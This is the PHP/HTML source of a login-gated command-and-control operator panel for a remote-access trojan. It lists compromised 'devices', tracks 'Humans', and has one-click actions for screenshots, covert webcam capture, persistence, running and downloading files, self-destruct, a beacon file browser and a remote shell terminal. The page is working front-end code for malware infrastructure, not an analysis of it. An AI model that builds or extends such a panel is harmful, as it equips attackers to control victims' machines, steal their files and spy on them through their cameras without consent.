<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/config.php';

if (!isAuthenticated()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_REQUEST['action'] ?? '') === 'login') {
        require_once __DIR__ . '/includes/router.php';
        routeRequest();
    }
    require_once __DIR__ . '/handlers/auth.php';
    renderLoginForm();
}
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Panel</title>
<link rel="stylesheet" href="assets/panel.css">
</head>
<body>
<div class="top">
    <h1>&#9670; C2 <span>Panel</span></h1>
    <div class="st">
        <span><b class="g">&#9679;</b> <span id="s-act">0</span> act</span>
        <span><b class="r">&#9679;</b> <span id="s-dead">0</span> dead</span>
        <span><span id="s-tot">0</span> tot</span>
        <span style="color:var(--amber)"><span id="s-pend">0</span> pend</span>
        <span style="color:var(--cyan)"><span id="s-done">0</span> done</span>
        <span><button id="hm-tg" class="btn btn-xs btn-hm" onclick="toggleHumans()">&#128100; Humans</button></span>
        <span><button class="btn btn-xs btn-gh" onclick="logout()">&#128682; Logout</button></span>
    </div>
</div>

<div class="hf">
<div class="sb">
    <div class="sh">
        Devices <span style="font-weight:400;color:var(--text2)" id="bcnt">(0)</span>
        <input id="bf" placeholder="search name, ip, uuid..." oninput="filterB()">
    </div>
    <div class="items" id="blist"></div>
</div>

<div class="sb off" id="psb">
    <div class="sh">
        HUMANS <span style="font-weight:400;color:var(--text2)" id="pcnt">(0)</span>
        <span style="display:flex;gap:3px;margin-top:3px">
            <button class="btn btn-xs btn-gh" onclick="personForm()" style="flex:1">+ Add</button>
            <button class="btn btn-xs btn-gh" onclick="loadPersons()">&#8635;</button>
        </span>
    </div>
    <div class="items" id="plist"></div>
</div>

<div class="rt">
    <div class="wc" id="wc">
        <div class="bg">&#9670;</div>
        Select a device
    </div>

    <div class="pn" id="bp">
        <div class="rw">
            <div class="cl">
                <div class="cd"><div class="ch">&#9679; Device Info</div>
                <div class="cb"><div class="ig" id="binfo"></div></div></div>
            </div>
            <div class="cl">
                <div class="cd"><div class="ch">&#9889; Quick Actions</div>
                <div class="cb">
                    <div class="qb">
                        <button class="btn btn-xs btn-gh" onclick="qc('pwd')">pwd</button>
                        <button class="btn btn-xs btn-b" onclick="qc('screenshot')">&#128247; screenshot</button>
                        <button class="btn btn-xs btn-b" onclick="qc('cam')">&#128248; cam</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('persist')">persist</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('run')">&#9654; run</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('download')">&#11015; dl</button>
                        <button class="btn btn-xs btn-r" onclick="if(confirm('Destroy?'))qc('selfdestruct')">&#128128; kill</button>
                        <button class="btn btn-xs btn-b" onclick="fmToggle()">&#128193; FM</button>
                        <button class="btn btn-xs btn-gh" onclick="dfToggle()">&#128451; DF</button>
                    </div>
                </div></div>
            </div>
        </div>

        <div class="cd"><div class="ch">&#128221; Notes</div>
        <div class="cb">
            <textarea class="nt" id="nt-in" placeholder="Notes about this device..."></textarea>
            <div class="nt-ct">
                <button class="btn btn-xs btn-g" onclick="saveNotes()">Save</button>
                <span id="nt-st" style="font-size:10px;color:var(--text2);margin-left:4px"></span>
            </div>
        </div></div>

        <div class="cd" id="fm-card">
            <div class="ch">&#128193; Beacon File Browser <span id="fm-nm" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="fmToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb fm-cb">
                <div class="fm-pb" id="fm-pb"><button class="btn btn-xs btn-g" onclick="fmGo()">&#10148;</button></div>
                <div id="fm-body"><div class="fm-nf">Click &#128193; FM in Quick Actions to open.</div></div>
            </div>
        </div>
        <div class="cd" id="df-card">
            <div class="ch">&#128451; Device Files <span id="df-nm" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="dfToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb fm-cb">
                <div id="df-body"><div class="fm-nf">Click &#128451; DF in Quick Actions to open.</div></div>
            </div>
        </div>
        <div class="rw" style="margin-top:12px">
            <div class="cl">
                <div class="cd"><div class="ch">&#128230; Uploaded Files</div>
                <div class="cb" id="bfs"><div style="color:var(--text2);font-size:11px">No files.</div></div></div>
            </div>
            <div class="cl">
                <div class="cd"><div class="ch">&#128247; Media <span id="mcn" style="font-weight:400;color:var(--text2)"></span></div>
                <div class="cb" id="bme"></div></div>
            </div>
        </div>
    </div>
    </div>

    <div class="tc" id="tc">
        <div class="th">&#9001; Terminal <span class="th-n" id="th-n">-</span></div>
        <div class="to" id="tout"><div class="l s">Select a device.</div></div>
        <div class="ti">
            <input id="tin" placeholder="shell whoami, browse, screenshot..." onkeydown="if(event.key==='Enter')dc()">
            <button class="btn btn-g" onclick="dc()">&#10148;</button>
        </div>
    </div>
</div>

<div class="modal" id="mim" onclick="this.classList.remove('on')"><div class="modal-c"><img id="mim-s"></div></div>
<div class="modal" id="pm"><div class="modal-c" style="max-width:500px;width:90vw;padding:0" id="pm-c"></div></div>
<div class="toast" id="toast"></div>

<script src="assets/panel.js"></script>
</body>
</html>
